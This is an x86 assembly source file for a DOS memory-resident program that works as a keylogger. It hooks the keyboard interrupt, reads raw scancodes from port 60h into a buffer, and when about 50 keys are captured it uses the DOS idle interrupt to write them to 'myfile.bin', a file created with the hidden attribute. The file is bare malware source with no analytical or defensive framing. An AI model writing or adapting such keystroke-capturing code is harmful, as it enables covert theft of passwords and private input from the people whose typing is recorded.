.386
.model use16 tiny
.code
org 100h

start:
    jmp Install
    ;Данные резидентной секции
    EnWrFile db 0
    EnWrBuf db 1
    FName db 'myfile.bin',0
    Max = 50
    Count dw 0
    Buf db 100h dup (?)

New09h:
    push ds
    push cs
    pop ds
    cmp EnWrBuf,0
    jz OutOfHandler09h

    push ax
    push bx
    in al,60h
    mov bx,Count
    mov Buf[bx],al
    inc Count
    cmp bx,Max
    jnz BufNotFull
    mov EnWrBuf,0
    mov EnWrFile,1

BufNotFull:
    pop bx
    pop ax

OutOfHandler09h:
    pop ds
    db 0EAh
    old09_off dw 0
    old09_seg dw 0

New28h:
    push ds
    push cs
    pop ds
    cmp EnWrFile,0
    jz OutOFHandler28h

    push ax
    push bx
    push cx
    push dx
    mov ah,3Ch
    mov cx,2
    mov dx,offset FName
    int 21h

    jc EndWr
    mov bx,ax
    mov ah,40h
    mov cx,100h
    mov dx,offset Buf
    int 21h

    mov ah,3Eh
    int 21h

EndWr:
    mov EnWrFile,0
    pop dx
    pop cx
    pop bx
    pop ax

OutOfHandler28h:
    pop ds
    db 0EAh
    old28_off dw 0
    old28_seg dw 0
    ResSize=$-start

Install:
    mov ax,3509h
    int 21h

    mov word ptr Old09_off,bx
    mov word ptr Old09_seg,es
    mov ax,2509h
    mov dx,offset New09h
    int 21h

    mov ax,3528h
    int 21h

    mov word ptr old28_off,bx
    mov word ptr old28_seg,es
    mov ax,2528h
    mov dx,offset New28h
    int 21h

    mov ax,3100h
    mov dx,(ResSize+10Fh)/16
    int 21h

end start
